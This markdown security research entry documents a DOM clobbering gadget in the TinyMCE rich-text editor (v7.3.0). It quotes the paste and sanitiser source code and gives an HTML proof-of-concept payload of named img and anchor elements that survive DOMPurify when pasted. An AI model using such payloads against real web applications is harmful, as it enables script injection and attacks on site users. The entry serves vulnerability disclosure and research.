## TinyMCE

### Meta

+ Library: TinyMCE-v5/6/7
+ Version: v7.3.0
+ Stars: 14.9K
+ Fingerprint: `typeof(window.tinymce) !== undefined`
+ Input: Copy&Paste
+ Sanitizer: DOMPurify
+ Capability: Any Tag & Any named property without collision
+ CVE: N/A
+ Status: N/A

### Library

https://github.com/tinymce/tinymce


### Vulnerable Code Snippet

Paste HTML
```
// https://github.com/tinymce/tinymce/blob/fbd71ae6a26251a56d72189a5788dd0554343e94/modules/tinymce/src/core/main/ts/paste/Clipboard.ts#L63
const pasteHtml = (editor: Editor, html: string, internalFlag: boolean, shouldSimulateInputEvent: boolean): void => {
  const internal = internalFlag ? internalFlag : InternalHtml.isMarked(html);
  doPaste(editor, InternalHtml.unmark(html), internal, false, shouldSimulateInputEvent);
};
```

TinyMCE internally uses the DOMPurify with defualt configuration to sanitize the input.
```
// https://github.com/tinymce/tinymce/blob/fbd71ae6a26251a56d72189a5788dd0554343e94/modules/tinymce/src/core/main/ts/paste/ProcessFilters.ts#L52
// https://github.com/tinymce/tinymce/blob/fbd71ae6a26251a56d72189a5788dd0554343e94/modules/tinymce/src/core/main/ts/api/html/DomParser.ts#L291
  const parseAndSanitizeWithContext = (html: string, rootName: string, format: string = 'html'): Element => {
    const mimeType = format === 'xhtml' ? 'application/xhtml+xml' : 'text/html';
    // Determine the root element to wrap the HTML in when parsing. If we're dealing with a
    // special element then we need to wrap it so the internal content is handled appropriately.
    const isSpecialRoot = Obj.has(schema.getSpecialElements(), rootName.toLowerCase());
    const content = isSpecialRoot ? `<${rootName}>${html}</${rootName}>` : html;
    const makeWrap = () => {
      if (format === 'xhtml') {
        // If parsing XHTML then the content must contain the xmlns declaration, see https://www.w3.org/TR/xhtml1/normative.html#strict
        return `<html xmlns="http://www.w3.org/1999/xhtml"><head></head><body>${content}</body></html>`;
      } else if (/^[\s]*<head/i.test(html) || /^[\s]*<html/i.test(html) || /^[\s]*<!DOCTYPE/i.test(html)) {
        return `<html>${content}</html>`;
      } else {
        return `<body>${content}</body>`;
      }
    };

    const body = parser.parseFromString(makeWrap(), mimeType).body;
    sanitizer.sanitizeHtmlElement(body, mimeType);
    return isSpecialRoot ? body.firstChild as Element : body;
  };
```


### PoC 

```html
<!--Library-->
<script src="https://cdn.tiny.cloud/1/kvw088syhtkdcjivzwu785cisjwpon4zfjj2isannsfsw555/tinymce/7/tinymce.min.js" referrerpolicy="origin"></script>

<script>
  tinymce.init({
  selector: 'textarea#default'
});
</script>
<textarea id="default">Hello, World!</textarea>
<!--Library-->


<!--Payload-->
<img name="currentScript" src="https://xxx.xxx.xxx">
<img name="attack" src="https://xxx.xxx.xxx">
<a name="attack" href="https://xxx.xxx.xxx">AAA</a>
<p>Copy & Paste the following rendered HTML elements to the editor and Run the following code: tinymce.activeEditor.getContent("default");</p>
<!--Payload-->
```